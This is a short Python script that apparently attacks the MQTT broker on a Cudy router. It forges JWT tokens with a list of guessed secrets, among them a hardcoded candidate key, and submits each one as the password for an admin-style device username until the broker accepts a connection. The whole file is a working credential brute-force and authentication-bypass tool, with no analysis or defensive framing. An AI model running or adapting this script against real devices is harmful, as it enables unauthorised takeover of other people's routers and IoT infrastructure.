import socket, jwt
HOST, PORT = "192.168.10.1", 1883
def enc(s):
    b = s.encode(); return bytes([len(b) >> 8, len(b) & 255]) + b
def connect(user, pw):
    vh = b"\x00\x04MQTT" + bytes([4, 0xC2, 0x00, 0x3C])
    body = vh + enc("omo") + enc(user) + enc(pw)
    pkt = bytes([0x10, len(body)]) + body
    s = socket.create_connection((HOST, PORT), timeout=4)
    s.sendall(pkt)
    d = s.recv(4)
    s.close()
    return d[3] if len(d) >= 4 else -1
deviceid = "000000000000"
user = "admincudydevice-" + deviceid
cands = ["", "0", "000000000000", "0000000000000000", "cudy", "Cudy", "cudy123", "cudysecret", "Cudy@123", "88T3j05dtFu8=", "secret", "admin", "admin123", "12345678", "WR3000", "wr3000", "password", "cudy1234"]
for c in cands:
    try:
        tok = jwt.encode({"exp": 1999999999, "username": user}, c, algorithm="HS256")
        rc = connect(user, tok)
        print(repr(c), "-> rc=", rc, ("ACCEPTED!!" if rc == 0 else ""))
        if rc == 0:
            break
    except Exception as e:
        print(repr(c), "ERR", e)

